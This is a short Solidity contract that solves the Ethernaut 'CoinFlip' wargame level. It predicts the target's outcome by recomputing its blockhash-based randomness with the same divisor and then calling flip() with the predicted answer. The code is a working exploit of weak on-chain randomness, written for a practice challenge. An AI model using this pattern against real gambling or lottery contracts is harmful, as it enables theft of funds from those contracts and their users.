import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract coinflip {
   using SafeMath for uint256;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
   event err(bool _side, uint256 _num);
   //@param _to address of the ethernaut coinflip contract
   function guesses(address payable _to) public {
     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
     uint256 coinFlip = blockValue.div(FACTOR);
     bool side = coinFlip == 1 ? true : false;
     (bool success, bytes memory data) = _to.call(
        abi.encodeWithSignature("flip(bool)", side)
     );
     emit err(side, coinFlip);
   }
}
